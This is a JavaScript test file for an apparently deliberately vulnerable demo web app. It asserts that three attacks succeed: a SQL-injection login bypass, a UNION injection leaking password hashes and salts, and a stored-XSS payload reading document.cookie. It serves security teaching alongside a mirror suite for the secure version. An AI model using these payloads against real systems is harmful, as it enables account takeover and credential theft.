'use strict';

// T18 — the VULNERABLE half of the asymmetric suite (SPEC.md §12, §10). These assert the §10 attack
// payloads SUCCEED — that is the deliverable's evidence. A red suite here means a vulnerability was
// accidentally fixed. The mirror file in secure/ asserts the identical payloads FAIL.
//
// The stored-XSS *execution* is a browser fact (innerHTML) shown in docs/attack-report.md; here we
// only prove the payload is stored verbatim, ready to fire at render.

const test = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const { createApp } = require('../server');
const pool = require('../db/connection');

const app = createApp();
const runId = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
const uname = (s) => `__test_${runId}_${s}`;
const VALID_PW = 'Kq7#mxzptvwR';

let canary;

test.before(async () => {
  const username = uname('canary');
  await request(app).post('/api/register')
    .send({ username, email: `${username}@ex.com`, password: VALID_PW }).expect(201);
  const agent = request.agent(app);
  await agent.post('/api/login').send({ username, password: VALID_PW }).expect(200);
  await agent.post('/api/customers').send({ name: uname('benign') }).expect(201);
  canary = { username, agent };
});

test.after(async () => {
  await pool.execute('DELETE FROM customers WHERE name LIKE ?', [`__test_${runId}_%`]);
  await pool.execute('DELETE FROM users WHERE username LIKE ?', [`__test_${runId}_%`]);
  await pool.end();
});

test('SC9: SQLi auth-bypass SUCCEEDS (the vulnerability being demonstrated)', async () => {
  const res = await request(app).post('/api/login')
    .send({ username: "' OR '1'='1' -- ", password: 'anything' });
  assert.equal(res.status, 200); // the -- comments out the password_hash check -> logged in
});

test('SC11: a UNION payload leaks users columns through customer search', async () => {
  const payload = "' UNION SELECT id, username, password_hash, salt, 1, 1, 1, NOW() FROM users -- ";
  const res = await canary.agent.get('/api/customers?search=' + encodeURIComponent(payload));
  assert.equal(res.status, 200);

  const body = JSON.stringify(res.body);
  assert.match(body, /[0-9a-f]{64}/); // a real password_hash surfaced
  assert.ok(res.body.some((row) => row.name === canary.username)); // a users row leaked as a "customer"
});

test('the stored-XSS payload is stored verbatim (renders via innerHTML in the browser — see report)', async () => {
  const name = uname('xss') + '<img src=x onerror="alert(document.cookie)">';
  const created = await canary.agent.post('/api/customers').send({ name });
  assert.equal(created.status, 201);
  assert.equal(created.body.name, name);

  const list = await canary.agent.get('/api/customers');
  const found = list.body.find((c) => c.id === created.body.id);
  assert.equal(found.name, name); // verbatim; the vulnerable client writes it with innerHTML
});
